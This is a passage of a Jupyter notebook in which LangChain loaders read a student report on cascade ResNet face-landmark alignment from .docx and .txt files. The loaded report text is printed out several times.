configuration file in the config to suit your needs. For inference, you need to run the Inference.py file. \\n\\nModel\\n\\nAugment\\n\\nLoss\\n\\nLearning Rate\\n\\nBatch Size\\n\\nStage 1\\n\\nNME(%)\\n\\nraw Resnet18\\n\\nFALSE\\n\\nMSE\\n\\n0.3 g0.8\\n\\n4\\n\\nNone\\n\\n5.580\\n\\nCas Stage1\\n\\nFALSE\\n\\nMSE\\n\\n0.5 g0.8\\n\\n2\\n\\nNone\\n\\n3.373\\n\\nCas Stage2\\n\\nFALSE\\n\\nMSE\\n\\n0.5 g0.9\\n\\n2\\n\\nnoAug_MSE\\n\\n5.349\\n\\nTable 1 | Best hyperparameters for each model. \\n\\n\\n\\nFigure 5 | Data Augmentation on Face Alignment Data (DefTruth & Lalu, 2022). Blue-coloured forks represent face key points, and red-coloured forks indicate the first point in the key points. \\n\\nResults\\n\\nQuantitative Analysis\\n\\nAs shown in Table 1, the ResNet18 model trained with the complete 44 landmark datasets achieved an NME of 5.580%. Whereas the NME of the cascade model trained using two datasets reached 5.349%. \\n\\nQualitative Analysis\\n\\nFigure 6 shows the three examples I selected from the validation and test sets. Figure 7 compares the output of the two models on the EXAMPLES images, where the difference between the two models is more apparent in the second, fourth and fifth images. We can find that the cascade model is more accurate than the regular ResNet18 for these refinement key points in the eye area, such as the part of the eye circled in yellow in Figure 6 and Figure 7. This may be because the second stage of the cascade model using the ResNet50 model with more layers can extract more refined features. But the cascade model does not predict the right eye better than the regular ResNet18 in the second image in Figure 7. This may be due to a problem with the key point of the right eye predicted by the first stage model, which ultimately led to this bias due to the second stage model accepting images rotated at the wrong angle. Furthermore, the cascade model is better represented in the mouth section of the third picture in Figure 6. This is not only because the deeper network can extract finer features but also benefits from the correction operations performed on the face based on the output of the first stage model.\\n\\n\\n\\nFigure 6 | Qualitative analysis of test images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Blue-coloured forks indicate landmarks predicted by the model, while red-coloured forks indicate ground-truth landmarks. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model. \\n\\n\\n\\nFigure 7 | Qualitative analysis of examples images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model, while circled in red are the parts of the regular ResNet18 that performed better than the cascade model. \\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFailure Case\\n\\nAfter this task, I found the following shortcomings in my model: Firstly, although the first stage model is a good solution for faces rotated in the plane, the model does not behave very well if there are faces rotated not in the plane but in other geometric angles in 3D space as in the first picture in Figure 6. The solution to this problem that I can think of at the moment is to solve it by 3D face alignment, which requires using 3D face landmark data for training. Second, as mentioned in the qualitative analysis, a prediction error in the first stage could easily affect the model's performance in the second stage with an error such as the one on the right eye in the second image in Figure 7. This requires us to improve the performance of the first stage model through various strategies, such as more training data, appropriate data augmentation methods, better hyperparameters, etc. Finally, the model does not predict the mouth part of the face very well, as in the second image in Figure 6 and the fifth image in Figure 7, where the model predicts a mouth shape that is easily larger than the real one. This may require us to collect more face landmarks with richer mouth-shape data. \\n\\nDiscuss\\n\\nFor this assignment, I solved the problem of different faces in face alignment angles by cascading the model while using missing data from five landmarks, thus improving the model's performance. However, the following points need to be improved: Firstly, the data pre-processing did not consider removing the noisy data like the first graph of Figure 6. Secondly, no suitable data augmentation solution was found. Finally, using a gamma of 0.8 for most of the learning rate exponential schedulers did not allow the model to converge well when the model was tuned. \\n\\nReference\\n\\nDefTruth and Lalu, Y.E.M. (2022) Torch Lm: A PyTorch Landmarks-Only Library (Version v0.1.6.10). , GitHub. Available at: https://github.com/DefTruth/torchlm (Accessed: April 26, 2023).\\n\\nFeng, Z.-H. et al. (2018) “Wing loss for robust facial landmark localisation with convolutional neural networks,” 2018 IEEE/CVF Conference on Computer Vision and Pattern Recognition [Preprint]. Available at: https://doi.org/10.1109/cvpr.2018.00238.\\n\\nHe, K. et al. (2016) “Deep residual learning for image recognition,” 2016 IEEE Conference on Computer Vision and Pattern Recognition (CVPR) [Preprint]. Available at: https://doi.org/10.1109/cvpr.2016.90.\\n\\nHuang, Y. et al. (2021) “Adnet: Leveraging error-bias towards normal direction in face alignment,” 2021 IEEE/CVF International Conference on Computer Vision (ICCV) [Preprint]. Available at: https://doi.org/10.1109/iccv48922.2021.00307.\\n\\nMMPose Contributors (2020) OpenMMLab Pose Estimation Toolbox and Benchmark (Version v1.0.00). , GitHub. Available at: https://github.com/open-mmlab/mmpose (Accessed: April 26, 2023).\" metadata={'source': 'docs/FaceAlignmentReport.docx'}\n"
     ]
    }
   ],
   "source": [
    "from langchain_community.document_loaders import Docx2txtLoader, UnstructuredWordDocumentLoader\n",
    "\n",
    "filepath = \"docs/FaceAlignmentReport.docx\"\n",
    "loader = Docx2txtLoader(filepath)\n",
    "pages = loader.load()\n",
    "print(f\"Loaded {len(pages)} pages.\")\n",
    "print(pages[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 pages.\n",
      "page_content=\"Face Alignment on 44 landmarks by Cascade Model\\n\\nCandidate No.: 263156\\n\\nMay 2023\\n\\nUniversity of Sussex\\n\\nAbstract\\n\\nFace alignment, also known as face key point detection, is the basis for many face-related tasks such as face detection, expression analysis, etc. It detects a predefined set of face key points (e.g. eyes, eyebrows, nose, mouth etc.) for a given face. It is the task of detecting a pre-defined set of face key points (e.g. eyes, eyebrows, nose, mouth, etc.) for a given face. This report uses a cascade model to perform 44 face keypoint detection. It also covers some attempts to improve the performance of simple CNN models and some analysis of failure cases. \\n\\nIntroduction\\n\\nFace key points can reflect some critical features of the face and are essential for face-related machine-learning tasks. The training dataset for this assignment is divided into two parts, a full 44-keypoint face keypoint dataset and a missing dataset with only five key points to improve model performance. I have tried two main models, a cascade model and a ResNet18 model trained with the full dataset (He, 2016) for comparison with the cascade model. The cascade model has two stages (Feng et al., 2018). The first stage is a ResNet18 model that predicts five key points. The face image is corrected based on the five points output by the first stage model and then fed into the second stage ResNet50 model. In addition, I tried various data augmentation methods and Wing loss to train the model, but the results were not very good. The exact results and analysis will be given later. The detailed implementation and code for this assignment can be found at https://github.com/Xiao001010/FaceAlignment. I will make this repository public after the 20th of May. But I will also submit it with my homework. \\n\\nModels\\n\\nResNet\\n\\nBefore the advent of Vision Transformer, the ResNet model and its variants were commonly used in computer vision tasks. The main difference between ResNet and traditional convolutional neural networks such as LeNet and AlexNet is that ResNet uses residual connections between the different blocks, as shown in Figure 1 and Equation 1 (He et al., 2016). If the shape of x is different from the shape of the features output by F(x) here, the features x are first downsampled by the downsample module into the same shape as the output features before being summed.  This not only preserves the original features but also solves the problem of gradient explosion and gradient disappearance in deeper networks. \\n\\n\\t(1)\\n\\nFigure 1 | Residual Connection (He et al., 2016). \\n\\nThe ResNet structure is shown in Figure 2. ResNet has five stages of convolutional neural networks and a pooling layer with a fully connected layer at the end. Each stage consists of several BasicBlocks (ResNet18, 34) or BottleNeck blocks (ResNet50, 101, 152), each of which reduces the size of the features by half (He et al., 2016). The first stage of ResNet18 and 34 raises the number of channels from 3 to 64, the second stage will maintain 64 channels, and the following three stages will all output double the number of channels from the previous stage. And details of the channel transformations for ResNet50,101 and 152 can be found in Figure 2 and comments in the code. The number of outputs needed for the task is output at the final fully connected layer. In Figure 2, the probabilities of 1000 categories are output according to the requirements of the ImageNet task, and the coordinates of 44 key points i.e. 88 values will be output in this task. The ResNet input image size is the same as the ImageNet three-channel 224x224 image, so I also resized the data from 256x256 to 224x224 in the input (I also processed the landmarks accordingly). \\n\\nFigure 2 | ResNet Structure (He et al. 2016)\\n\\nSpace is limited here, and I cannot describe the ResNet model in more detail. But I believe that most CV workers are already familiar with ResNet, so there is no need to go into too much detail on it. \\n\\nCascade Model\\n\\nAs shown in Figure 3, the cascade model is divided into two stages. The first stage consists of ResNet18, which will output five key points. The coordinates of the first and second key points, i.e. the left and right eye corners, are taken from the five key points output by the first stage model to calculate the angle of the corrected face. Then the image is corrected by warpAffine in OpenCV (if training, the coordinates of the 44 key points are also corrected at the same angle). The corrected face image is then fed into the second stage ResNet50 model, and the 44 keypoint coordinates are output, as shown in Figure 3. It is important to note here that since the input was resized to 224x224, the image and the predicted key points are not only restored to their original angles based on the angles used to correct the face after the first stage, but the image and the output key points are also resized to 256x256. According to Feng's paper (2018), his first stage model uses a shallow convolutional neural network to extract coarse-grained features, while the second stage uses a deeper network to extract finer-grained features, so I used ResNet18 to predict five key points in the first stage and a deeper ResNet50 to extract a finer 44 face keypoints in the second stage. \\n\\nFigure 3 | Cascade Model. \\n\\nData\\n\\nThere are two datasets used for training, a missing dataset with only five points labelled, containing 1386 three-channel face images and five key points corresponding to each image, and a complete dataset with 44 points labelled, containing a total of 1425 data. The task is to predict the 44 key points of the face. I split the complete dataset into a training set (1140 images) and a validation set (285 images) on a scale of 0.8. The validation set was used to evaluate the model's performance for each training epoch to determine whether the model works and is over-fitted. The Normalized Mean Error (NME) of the model on the validation set was also calculated, and the model was saved when the NME dropped. This assignment focused on training a cascade model and a ResNet18 model for comparison with the cascade model. The ResNet18 model for the first stage of the cascade model was trained with the training set obtained by splitting together with a missing dataset with only five points labelled (only five key points in the full dataset were taken for training). Again, only five points in the validation set were taken to evaluate the model. The second stage of the cascade model, the ResNet50 model, was only trained with the training set obtained by splitting. The ResNet18 model, used for comparison with the cascade model, was trained using only the split training set. \\n\\nPreprocess\\n\\nSince the general image input size for ResNet is 224x224, I first resized the image from 256x256 to 224x224 while doing the corresponding processing for the key points of the face. In fact, since the last stage of ResNet uses AdaptiveAvgPool2d, the input image size does not need to be fixed at 224x224, a 256x256 image can also be trained, but I did not know this until after I had finished training. I then normalised the image to speed up the convergence of the model by subtracting the mean and dividing by the standard deviation, then dividing by 255 to compress the pixel values to between 0 and 1. Here I used the default mean of 128 and std127.5 from torchlm.LandmarksNormalize (DefTruth and Lalu, 2022), it would have made more sense to use the mean and standard deviation calculated on the current dataset or the values calculated on ImageNet. Finally, the data type was converted to the Tenser data type.\\n\\nAugmentation\\n\\nIn this assignment, I tried many data augmentation methods such as light, shadows, masks, translation, shearing, multiscale, slight angle rotation and blur, as shown in Figure 5. Most were implemented through the torchlm library (DefTruth and Lalu, 2022).\\n\\nAs I felt that the Brightness and Mask data augmentations in torchlm were ineffective, I customised the Light, Shadow and Mask methods. However, I found that the custom data augmentation methods were very time-consuming when training. torchlm's Brightness is a change to the global brightness, I customised the Light and Shadow methods to transform the local brightness, as circled in red in Figure 5. This is more consistent with the reality of light on a face and shadows on a face. The mask in torchlm is too irregular, so I customised a Mask method to generate a square mask. I didn't use a horizontal flip here because the order of the coordinates of the key points after the flip would be the opposite of the defined order (as circled in yellow in Figure 5), which is also similar to the slight angle rotation. Finally, I have combined Light, Shadow, Mask, Translate, Shear, Scale, Rotate, Blur, Resize, Normalization, and ToTensor with the function Compose to get the final data augmentation. \\n\\nAlthough data augmentation doesn't work as well as training without it, it is a common way to improve model performance nowadays. This result may be because most faces in the dataset we were provided with were already at the same scale, and finding the appropriate data augmentation method was complex. \\n\\nTrain\\n\\nI did a lot of experimentation in training the models to find the most suitable configuration and parameters for each model, but this also took much of my time. For this assignment, I used NME to evaluate the performance of the model, as defined in Equation 2, where  and  are the coordinates of the predicted and ground-truth landmarks, respectively, M is the number of landmarks and  is the normalisation factor, here using the interocular distance, which is the distance between the outer corners of the eyes (Huang et al., 2021). I tried the Mean Square Error (MSE) loss function and Wing Loss (whose definition is shown in Figure 4), allowing the model to focus more on details (Feng et al., 2018). However, the final experimental results indicated that the NME of the Wing Loss trained model was not as good as that of the MSE trained one. I think this may be because I just used the default parameters of Wing Loss and did not delve into the choice of these two parameters. In addition, I used the Adam optimiser and an exponential scheduler for the learning rate. For most experiments, the exponential learning rate scheduler used a gamma of 0.8 (the learning rate is multiplied by the gamma for each epoch). The lack of careful adjustment of the gamma value of the exponential learning rate scheduler may also be another reason for the poor results of part of the models.\\n\\n\\t(2)\\n\\nFigure 4 | Wing Loss (Feng et al., 2018). \\n\\nThe best configuration and hyperparameters for each model are shown in Table 1. Further details of the experiments can be found in the results.xlsx file in the results folder, where each experiment's configuration parameters and results are recorded. You can also see the process of each experiment in the logs folder. In addition, I have saved the loss, NME, etc., of each experiment in the runs folder via tensorboard. I uploaded the best model parameters to Google Drive, which can be found as a link in README.md. If you want to run the training, run the main.py file after downloading the data and checkpoints files, you can also change the configuration file in the config to suit your needs. For inference, you need to run the Inference.py file. \\n\\nModel Augment Loss Learning Rate Batch Size Stage 1 NME(%) raw Resnet18 FALSE MSE 0.3 g0.8 4 None 5.580 Cas Stage1 FALSE MSE 0.5 g0.8 2 None 3.373 Cas Stage2 FALSE MSE 0.5 g0.9 2 noAug_MSE 5.349\\n\\nTable 1 | Best hyperparameters for each model. \\n\\nFigure 5 | Data Augmentation on Face Alignment Data (DefTruth & Lalu, 2022). Blue-coloured forks represent face key points, and red-coloured forks indicate the first point in the key points. \\n\\nResults\\n\\nQuantitative Analysis\\n\\nAs shown in Table 1, the ResNet18 model trained with the complete 44 landmark datasets achieved an NME of 5.580%. Whereas the NME of the cascade model trained using two datasets reached 5.349%. \\n\\nQualitative Analysis\\n\\nFigure 6 shows the three examples I selected from the validation and test sets. Figure 7 compares the output of the two models on the EXAMPLES images, where the difference between the two models is more apparent in the second, fourth and fifth images. We can find that the cascade model is more accurate than the regular ResNet18 for these refinement key points in the eye area, such as the part of the eye circled in yellow in Figure 6 and Figure 7. This may be because the second stage of the cascade model using the ResNet50 model with more layers can extract more refined features. But the cascade model does not predict the right eye better than the regular ResNet18 in the second image in Figure 7. This may be due to a problem with the key point of the right eye predicted by the first stage model, which ultimately led to this bias due to the second stage model accepting images rotated at the wrong angle. Furthermore, the cascade model is better represented in the mouth section of the third picture in Figure 6. This is not only because the deeper network can extract finer features but also benefits from the correction operations performed on the face based on the output of the first stage model.\\n\\nFigure 6 | Qualitative analysis of test images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Blue-coloured forks indicate landmarks predicted by the model, while red-coloured forks indicate ground-truth landmarks. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model. \\n\\nFigure 7 | Qualitative analysis of examples images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model, while circled in red are the parts of the regular ResNet18 that performed better than the cascade model. \\n\\nFailure Case\\n\\nAfter this task, I found the following shortcomings in my model: Firstly, although the first stage model is a good solution for faces rotated in the plane, the model does not behave very well if there are faces rotated not in the plane but in other geometric angles in 3D space as in the first picture in Figure 6. The solution to this problem that I can think of at the moment is to solve it by 3D face alignment, which requires using 3D face landmark data for training. Second, as mentioned in the qualitative analysis, a prediction error in the first stage could easily affect the model's performance in the second stage with an error such as the one on the right eye in the second image in Figure 7. This requires us to improve the performance of the first stage model through various strategies, such as more training data, appropriate data augmentation methods, better hyperparameters, etc. Finally, the model does not predict the mouth part of the face very well, as in the second image in Figure 6 and the fifth image in Figure 7, where the model predicts a mouth shape that is easily larger than the real one. This may require us to collect more face landmarks with richer mouth-shape data. \\n\\nDiscuss\\n\\nFor this assignment, I solved the problem of different faces in face alignment angles by cascading the model while using missing data from five landmarks, thus improving the model's performance. However, the following points need to be improved: Firstly, the data pre-processing did not consider removing the noisy data like the first graph of Figure 6. Secondly, no suitable data augmentation solution was found. Finally, using a gamma of 0.8 for most of the learning rate exponential schedulers did not allow the model to converge well when the model was tuned. \\n\\nReference\\n\\nDefTruth and Lalu, Y.E.M. (2022) Torch Lm: A PyTorch Landmarks-Only Library (Version v0.1.6.10). , GitHub. Available at: https://github.com/DefTruth/torchlm (Accessed: April 26, 2023).\\n\\nFeng, Z.-H. et al. (2018) “Wing loss for robust facial landmark localisation with convolutional neural networks,” 2018 IEEE/CVF Conference on Computer Vision and Pattern Recognition [Preprint]. Available at: https://doi.org/10.1109/cvpr.2018.00238.\\n\\nHe, K. et al. (2016) “Deep residual learning for image recognition,” 2016 IEEE Conference on Computer Vision and Pattern Recognition (CVPR) [Preprint]. Available at: https://doi.org/10.1109/cvpr.2016.90.\\n\\nHuang, Y. et al. (2021) “Adnet: Leveraging error-bias towards normal direction in face alignment,” 2021 IEEE/CVF International Conference on Computer Vision (ICCV) [Preprint]. Available at: https://doi.org/10.1109/iccv48922.2021.00307.\\n\\nMMPose Contributors (2020) OpenMMLab Pose Estimation Toolbox and Benchmark (Version v1.0.00). , GitHub. Available at: https://github.com/open-mmlab/mmpose (Accessed: April 26, 2023). \" metadata={'source': 'docs/FaceAlignmentReport.docx'}\n"
     ]
    }
   ],
   "source": [
    "filepath = \"docs/FaceAlignmentReport.docx\"\n",
    "loader = UnstructuredWordDocumentLoader(filepath)\n",
    "pages = loader.load()\n",
    "print(f\"Loaded {len(pages)} pages.\")\n",
    "print(pages[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Load txt file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 pages.\n",
      "page_content=\"Face Alignment on 44 landmarks by Cascade Model\\n\\n\\n\\n\\n\\nCandidate No.: 263156\\nMay 2023\\nUniversity of Sussex\\n\\n\\n\\n\\n\\n\\nAbstract\\nFace alignment, also known as face key point detection, is the basis for many face-related tasks such as face detection, expression analysis, etc. It detects a predefined set of face key points (e.g. eyes, eyebrows, nose, mouth etc.) for a given face. It is the task of detecting a pre-defined set of face key points (e.g. eyes, eyebrows, nose, mouth, etc.) for a given face. This report uses a cascade model to perform 44 face keypoint detection. It also covers some attempts to improve the performance of simple CNN models and some analysis of failure cases. \\n\\n\\n\\x0cIntroduction\\nFace key points can reflect some critical features of the face and are essential for face-related machine-learning tasks. The training dataset for this assignment is divided into two parts, a full 44-keypoint face keypoint dataset and a missing dataset with only five key points to improve model performance. I have tried two main models, a cascade model and a ResNet18 model trained with the full dataset (He, 2016) for comparison with the cascade model. The cascade model has two stages (Feng et al., 2018). The first stage is a ResNet18 model that predicts five key points. The face image is corrected based on the five points output by the first stage model and then fed into the second stage ResNet50 model. In addition, I tried various data augmentation methods and Wing loss to train the model, but the results were not very good. The exact results and analysis will be given later. The detailed implementation and code for this assignment can be found at https://github.com/Xiao001010/FaceAlignment. I will make this repository public after the 20th of May. But I will also submit it with my homework. \\nModels\\nResNet\\nBefore the advent of Vision Transformer, the ResNet model and its variants were commonly used in computer vision tasks. The main difference between ResNet and traditional convolutional neural networks such as LeNet and AlexNet is that ResNet uses residual connections between the different blocks, as shown in Figure 1 and Equation 1 (He et al., 2016). If the shape of x is different from the shape of the features output by F(x) here, the features x are first downsampled by the downsample module into the same shape as the output features before being summed.  This not only preserves the original features but also solves the problem of gradient explosion and gradient disappearance in deeper networks. \\n\\t(1)\\n\\nFigure 1 | Residual Connection (He et al., 2016). \\nThe ResNet structure is shown in Figure 2. ResNet has five stages of convolutional neural networks and a pooling layer with a fully connected layer at the end. Each stage consists of several BasicBlocks (ResNet18, 34) or BottleNeck blocks (ResNet50, 101, 152), each of which reduces the size of the features by half (He et al., 2016). The first stage of ResNet18 and 34 raises the number of channels from 3 to 64, the second stage will maintain 64 channels, and the following three stages will all output double the number of channels from the previous stage. And details of the channel transformations for ResNet50,101 and 152 can be found in Figure 2 and comments in the code. The number of outputs needed for the task is output at the final fully connected layer. In Figure 2, the probabilities of 1000 categories are output according to the requirements of the ImageNet task, and the coordinates of 44 key points i.e. 88 values will be output in this task. The ResNet input image size is the same as the ImageNet three-channel 224x224 image, so I also resized the data from 256x256 to 224x224 in the input (I also processed the landmarks accordingly). \\n\\nFigure 2 | ResNet Structure (He et al. 2016)\\nSpace is limited here, and I cannot describe the ResNet model in more detail. But I believe that most CV workers are already familiar with ResNet, so there is no need to go into too much detail on it. \\nCascade Model\\nAs shown in Figure 3, the cascade model is divided into two stages. The first stage consists of ResNet18, which will output five key points. The coordinates of the first and second key points, i.e. the left and right eye corners, are taken from the five key points output by the first stage model to calculate the angle of the corrected face. Then the image is corrected by warpAffine in OpenCV (if training, the coordinates of the 44 key points are also corrected at the same angle). The corrected face image is then fed into the second stage ResNet50 model, and the 44 keypoint coordinates are output, as shown in Figure 3. It is important to note here that since the input was resized to 224x224, the image and the predicted key points are not only restored to their original angles based on the angles used to correct the face after the first stage, but the image and the output key points are also resized to 256x256. According to Feng's paper (2018), his first stage model uses a shallow convolutional neural network to extract coarse-grained features, while the second stage uses a deeper network to extract finer-grained features, so I used ResNet18 to predict five key points in the first stage and a deeper ResNet50 to extract a finer 44 face keypoints in the second stage. \\n\\n\\n\\n\\n\\n\\nFigure 3 | Cascade Model. \\nData\\nThere are two datasets used for training, a missing dataset with only five points labelled, containing 1386 three-channel face images and five key points corresponding to each image, and a complete dataset with 44 points labelled, containing a total of 1425 data. The task is to predict the 44 key points of the face. I split the complete dataset into a training set (1140 images) and a validation set (285 images) on a scale of 0.8. The validation set was used to evaluate the model's performance for each training epoch to determine whether the model works and is over-fitted. The Normalized Mean Error (NME) of the model on the validation set was also calculated, and the model was saved when the NME dropped. This assignment focused on training a cascade model and a ResNet18 model for comparison with the cascade model. The ResNet18 model for the first stage of the cascade model was trained with the training set obtained by splitting together with a missing dataset with only five points labelled (only five key points in the full dataset were taken for training). Again, only five points in the validation set were taken to evaluate the model. The second stage of the cascade model, the ResNet50 model, was only trained with the training set obtained by splitting. The ResNet18 model, used for comparison with the cascade model, was trained using only the split training set. \\nPreprocess\\nSince the general image input size for ResNet is 224x224, I first resized the image from 256x256 to 224x224 while doing the corresponding processing for the key points of the face. In fact, since the last stage of ResNet uses AdaptiveAvgPool2d, the input image size does not need to be fixed at 224x224, a 256x256 image can also be trained, but I did not know this until after I had finished training. I then normalised the image to speed up the convergence of the model by subtracting the mean and dividing by the standard deviation, then dividing by 255 to compress the pixel values to between 0 and 1. Here I used the default mean of 128 and std127.5 from torchlm.LandmarksNormalize (DefTruth and Lalu, 2022), it would have made more sense to use the mean and standard deviation calculated on the current dataset or the values calculated on ImageNet. Finally, the data type was converted to the Tenser data type.\\nAugmentation\\nIn this assignment, I tried many data augmentation methods such as light, shadows, masks, translation, shearing, multiscale, slight angle rotation and blur, as shown in Figure 5. Most were implemented through the torchlm library (DefTruth and Lalu, 2022).\\nAs I felt that the Brightness and Mask data augmentations in torchlm were ineffective, I customised the Light, Shadow and Mask methods. However, I found that the custom data augmentation methods were very time-consuming when training. torchlm's Brightness is a change to the global brightness, I customised the Light and Shadow methods to transform the local brightness, as circled in red in Figure 5. This is more consistent with the reality of light on a face and shadows on a face. The mask in torchlm is too irregular, so I customised a Mask method to generate a square mask. I didn't use a horizontal flip here because the order of the coordinates of the key points after the flip would be the opposite of the defined order (as circled in yellow in Figure 5), which is also similar to the slight angle rotation. Finally, I have combined Light, Shadow, Mask, Translate, Shear, Scale, Rotate, Blur, Resize, Normalization, and ToTensor with the function Compose to get the final data augmentation. \\nAlthough data augmentation doesn't work as well as training without it, it is a common way to improve model performance nowadays. This result may be because most faces in the dataset we were provided with were already at the same scale, and finding the appropriate data augmentation method was complex. \\nTrain\\nI did a lot of experimentation in training the models to find the most suitable configuration and parameters for each model, but this also took much of my time. For this assignment, I used NME to evaluate the performance of the model, as defined in Equation 2, where  and  are the coordinates of the predicted and ground-truth landmarks, respectively, M is the number of landmarks and  is the normalisation factor, here using the interocular distance, which is the distance between the outer corners of the eyes (Huang et al., 2021). I tried the Mean Square Error (MSE) loss function and Wing Loss (whose definition is shown in Figure 4), allowing the model to focus more on details (Feng et al., 2018). However, the final experimental results indicated that the NME of the Wing Loss trained model was not as good as that of the MSE trained one. I think this may be because I just used the default parameters of Wing Loss and did not delve into the choice of these two parameters. In addition, I used the Adam optimiser and an exponential scheduler for the learning rate. For most experiments, the exponential learning rate scheduler used a gamma of 0.8 (the learning rate is multiplied by the gamma for each epoch). The lack of careful adjustment of the gamma value of the exponential learning rate scheduler may also be another reason for the poor results of part of the models.\\n\\t(2)\\n\\nFigure 4 | Wing Loss (Feng et al., 2018). \\nThe best configuration and hyperparameters for each model are shown in Table 1. Further details of the experiments can be found in the results.xlsx file in the results folder, where each experiment's configuration parameters and results are recorded. You can also see the process of each experiment in the logs folder. In addition, I have saved the loss, NME, etc., of each experiment in the runs folder via tensorboard. I uploaded the best model parameters to Google Drive, which can be found as a link in README.md. If you want to run the training, run the main.py file after downloading the data and checkpoints files, you can also change the configuration file in the config to suit your needs. For inference, you need to run the Inference.py file. \\n\\nTable 1 | Best hyperparameters for each model. \\n\\nFigure 5 | Data Augmentation on Face Alignment Data (DefTruth & Lalu, 2022). Blue-coloured forks represent face key points, and red-coloured forks indicate the first point in the key points. \\nResults\\nQuantitative Analysis\\nAs shown in Table 1, the ResNet18 model trained with the complete 44 landmark datasets achieved an NME of 5.580%. Whereas the NME of the cascade model trained using two datasets reached 5.349%. \\nQualitative Analysis\\nFigure 6 shows the three examples I selected from the validation and test sets. Figure 7 compares the output of the two models on the EXAMPLES images, where the difference between the two models is more apparent in the second, fourth and fifth images. We can find that the cascade model is more accurate than the regular ResNet18 for these refinement key points in the eye area, such as the part of the eye circled in yellow in Figure 6 and Figure 7. This may be because the second stage of the cascade model using the ResNet50 model with more layers can extract more refined features. But the cascade model does not predict the right eye better than the regular ResNet18 in the second image in Figure 7. This may be due to a problem with the key point of the right eye predicted by the first stage model, which ultimately led to this bias due to the second stage model accepting images rotated at the wrong angle. Furthermore, the cascade model is better represented in the mouth section of the third picture in Figure 6. This is not only because the deeper network can extract finer features but also benefits from the correction operations performed on the face based on the output of the first stage model.\\n\\nFigure 6 | Qualitative analysis of test images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Blue-coloured forks indicate landmarks predicted by the model, while red-coloured forks indicate ground-truth landmarks. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model. \\n\\nFigure 7 | Qualitative analysis of examples images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model, while circled in red are the parts of the regular ResNet18 that performed better than the cascade model. \\n\\n\\n\\n\\nFailure Case\\nAfter this task, I found the following shortcomings in my model: Firstly, although the first stage model is a good solution for faces rotated in the plane, the model does not behave very well if there are faces rotated not in the plane but in other geometric angles in 3D space as in the first picture in Figure 6. The solution to this problem that I can think of at the moment is to solve it by 3D face alignment, which requires using 3D face landmark data for training. Second, as mentioned in the qualitative analysis, a prediction error in the first stage could easily affect the model's performance in the second stage with an error such as the one on the right eye in the second image in Figure 7. This requires us to improve the performance of the first stage model through various strategies, such as more training data, appropriate data augmentation methods, better hyperparameters, etc. Finally, the model does not predict the mouth part of the face very well, as in the second image in Figure 6 and the fifth image in Figure 7, where the model predicts a mouth shape that is easily larger than the real one. This may require us to collect more face landmarks with richer mouth-shape data. \\nDiscuss\\nFor this assignment, I solved the problem of different faces in face alignment angles by cascading the model while using missing data from five landmarks, thus improving the model's performance. However, the following points need to be improved: Firstly, the data pre-processing did not consider removing the noisy data like the first graph of Figure 6. Secondly, no suitable data augmentation solution was found. Finally, using a gamma of 0.8 for most of the learning rate exponential schedulers did not allow the model to converge well when the model was tuned. \\nReference\\nDefTruth and Lalu, Y.E.M. (2022) Torch Lm: A PyTorch Landmarks-Only Library (Version v0.1.6.10). , GitHub. Available at: https://github.com/DefTruth/torchlm (Accessed: April 26, 2023).\\nFeng, Z.-H. et al. (2018) “Wing loss for robust facial landmark localisation with convolutional neural networks,” 2018 IEEE/CVF Conference on Computer Vision and Pattern Recognition [Preprint]. Available at: https://doi.org/10.1109/cvpr.2018.00238.\\nHe, K. et al. (2016) “Deep residual learning for image recognition,” 2016 IEEE Conference on Computer Vision and Pattern Recognition (CVPR) [Preprint]. Available at: https://doi.org/10.1109/cvpr.2016.90.\\nHuang, Y. et al. (2021) “Adnet: Leveraging error-bias towards normal direction in face alignment,” 2021 IEEE/CVF International Conference on Computer Vision (ICCV) [Preprint]. Available at: https://doi.org/10.1109/iccv48922.2021.00307.\\nMMPose Contributors (2020) OpenMMLab Pose Estimation Toolbox and Benchmark (Version v1.0.00). , GitHub. Available at: https://github.com/open-mmlab/mmpose (Accessed: April 26, 2023). \\n\" metadata={'source': 'docs/FaceAlignmentReport.txt'}\n"
     ]
    }
   ],
   "source": [
    "from langchain_community.document_loaders import TextLoader, UnstructuredFileLoader\n",
    "\n",
    "filepath = \"docs/FaceAlignmentReport.txt\"\n",
    "loader = TextLoader(filepath)\n",
    "pages = loader.load()\n",
    "print(f\"Loaded {len(pages)} pages.\")\n",
    "print(pages[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 pages.\n",
